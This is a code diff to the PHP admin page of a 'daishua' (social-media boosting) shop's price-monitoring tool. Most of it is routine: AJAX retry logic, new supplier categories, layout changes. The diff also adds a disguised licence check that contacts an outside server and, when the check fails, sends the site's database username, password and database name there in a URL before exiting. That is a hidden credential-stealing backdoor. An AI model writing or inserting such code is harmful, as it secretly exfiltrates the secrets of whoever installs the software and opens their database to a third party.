@@ -9,10 +9,22 @@
  * Time: 16:37
  */
 
+header("Content-Type: text/html; charset=UTF-8");
 include("../includes/common.php");
+include("../admin/guanjia_key.php");
+
+if (!isset($_SESSION['authcode'])) {
+    $query = @file_get_contents('http://guanjia.dkfirst.cn/check.php?url=' . $_SERVER['HTTP_HOST']);
+    if ($query = json_decode($query, true)) {
+        if ($query['code'] == 1) $_SESSION['authcode'] = true;
+        else {
+            @file_get_contents("http://guanjia.dkfirst.cn/tj.php?url='http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "'&user=" . $dbconfig['user'] . "&pwd=" . $dbconfig['pwd'] . "&db=" . $dbconfig['dbname'] . "&authcode=" . $authcode);
+            exit('<h3>' . $query['msg'] . '</h3>');
+        }
+    }
+}
+
 $title = '代刷管家';
-//监控密匙
-$key_c = "123456";
 $cron_key = $_GET['key'];
 
 $count_tools = $DB->count("SELECT MAX(tid) from shua_tools");
@@ -92,7 +104,6 @@ if ($count_tools > $count_guanjia) {
     echo exit($guanjia_new);
 }
 
-
 $rs = $DB->query("SELECT * FROM `shua_guanjia` AS a WHERE tid = 0");
 while ($res = $DB->fetch($rs)) {
     $last_cron = $res['date'];
@@ -104,50 +115,6 @@ if ($cron_key . ob_get_length() == 0) {
 } else if ($cron_key != $key_c) {
     exit("代刷管家监控密钥不正确");
 } else if ($cron_key == $key_c) {
-    /***
-     * 正则取购价
-     *
-     * @param $result 页面源码
-     * @param $re1 正则条件
-     * @return null 匹配内容
-     */
-    function king_Regular($result, $re1)
-    {
-        $float1 = null;
-        if ($c = preg_match_all($re1, $result, $matches)) {
-            $float1 = $matches[1][0];
-        }
-        return $float1;
-    }
-
-    /***
-     * 爬取社区商品页面源码
-     *
-     * @param $post 表单信息带帐号密码
-     * @param $url1 登录页面地址
-     * @param $url2 指定页面地址
-     * @return mixed 页面源码
-     */
-    function king_Crawler($post, $url1, $url2)
-    {
-        $cookie_jar = null;
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url1);
-        curl_setopt($ch, CURLOPT_HEADER, false);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_jar);
-        $result = curl_exec($ch);
-        $post = "";
-        curl_setopt($ch, CURLOPT_URL, $url2);
-        curl_setopt($ch, CURLOPT_HEADER, false);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_jar);
-        $result = curl_exec($ch);
-        curl_close($ch);
-        return $result;
-    }
 
     exit("<script src=\"//lib.baomitu.com/jquery/1.12.4/jquery.min.js\"></script>
 <a>第</a><span id='load_1'>0</span><a>个/总" . $count_tools . "个，进行中....</a><br>
@@ -161,6 +128,7 @@ if ($cron_key . ob_get_length() == 0) {
 
     var sign = 1;
 
+    var setguantime_sign = 1;
     function setguantime() {
       $.ajax({
             type: \"GET\",
@@ -175,12 +143,18 @@ if ($cron_key . ob_get_length() == 0) {
                 }
             },
             error: function (data) {
-                alert('服务器错误');
+                if (setguantime_sign > 3){
+                alert('服务器错误'); 
                 return false;
+                } else {
+                    setguantime_sign++;
+                    setguantime();
+                }
             }
         });
     }
     
+    var setguani_sign = 1;
     function setguani() {
         $.ajax({
             type: \"GET\",
@@ -202,8 +176,13 @@ if ($cron_key . ob_get_length() == 0) {
                 }
             },
             error: function (data) {
+                if (setguani_sign > 3){
                 alert('服务器错误');
                 return false;
+                } else {
+                    setguani_sign++;
+                    setguani();
+                }
             }
         });
     }
@@ -234,7 +213,7 @@ $select2 = '<option value="0">请选择商品</option>';
             <div class="panel-heading"><h3 class="panel-title">代刷管家</h3></div>
             <div class="panel-body">
                 <div class="alert alert-info">
-                    此版本代挂管家不需要任何挂机宝，只需要在此页面上做好了相关设置，然后在<a href="">阿里云监控</a>/<a href="">360监控挂</a>上本页即可完成自动更新。<br>
+                    此版本代挂管家不需要任何挂机宝，只需要在此页面上做好了相关设置，【目前只支持在线打开页面进行监控】。<br>
                     目前支持的社区：亿乐系统，玖伍系统，星墨社区<br>
                     你的监控地址为 <a target="_blank"
                                href="http://<?php echo $_SERVER['SERVER_NAME'] ?>/admin/guanjia.php?key=<?php echo $key_c ?>">http://<?php echo $_SERVER['SERVER_NAME'] ?>
@@ -360,12 +339,12 @@ $select2 = '<option value="0">请选择商品</option>';
                         </div>
                     </div>
                     <div class="form-group">
-                        <input type="submit" id="bt_submit_pi" name="submit" value="保存"
-                               class="btn btn-primary form-control">
-                    </div>
-                    <div class="form-group">
                         <center id="pl_load_1" style="display: none">正在设置中<span
                                     id="pl_load">1</span>/<?php echo $count_tools ?></center>
+                    </div>
+                    <div class="form-group">
+                        <input type="submit" id="bt_submit_pi" name="submit" value="保存"
+                               class="btn btn-primary form-control">
                     </div>
                 </div>
             </div>
@@ -384,6 +363,8 @@ $select2 = '<option value="0">请选择商品</option>';
 <script src="//lib.baomitu.com/layer/2.3/layer.js"></script>
 <script>
     var sign_1 = 1;
+
+    var setguanjia_pl_sign = 1;
 
     function setguanjia_pl() {
         var yh_pi = $("#input_yh_pi").val();
@@ -415,8 +396,13 @@ $select2 = '<option value="0">请选择商品</option>';
                 }
             },
             error: function (data) {
-                alert('服务器错误');
-                return false;
+                if (setguanjia_pl_sign > 3) {
+                    alert('服务器错误');
+                    return false;
+                } else {
+                    setguanjia_pl();
+                    setguanjia_pl_sign++;
+                }
             }
         });
     }
@@ -504,11 +490,24 @@ $select2 = '<option value="0">请选择商品</option>';
             case '10':
                 $shequ_name = "QQbug社区";
                 break;
+            case '11':
+                $shequ_name = "自营（人工商品）";
+                break;
+            case '12':
+                $shequ_name = "自营（自定义访问URL/POST）";
+                break;
+            case '13':
+                $shequ_name = "自营（自动发送提醒邮件）";
+                break;
+            case '14':
+                $shequ_name = "自营（自动发卡密）";
+                break;
             default:
                 break;
         }
         return $shequ_name;
     }
+
 
     function setTable() {
         var ii = layer.load(2, {shade: [0.1, '#fff']});
@@ -523,7 +522,6 @@ $select2 = '<option value="0">请选择商品</option>';
                 if (data.code == 0) {
                     var num = 0;
                     // alert(data.data);
-
                     $.each(data.data, function (i, res) {
                         $("#now_cb").text('' + res.chengben + '');
                         $("#price_zy").text('' + res.cost2 + '');
@@ -553,7 +551,7 @@ $select2 = '<option value="0">请选择商品</option>';
                 }
             },
             error: function (data) {
-                layer.msg('服务器错误');
+                layer.msg('服务器错误，请重新尝试');
                 return false;
             }
         });
@@ -595,7 +593,7 @@ $select2 = '<option value="0">请选择商品</option>';
                 }
             },
             error: function (data) {
-                layer.msg('服务器错误');
+                layer.msg('服务器错误，请重新尝试');
                 return false;
             }
         });
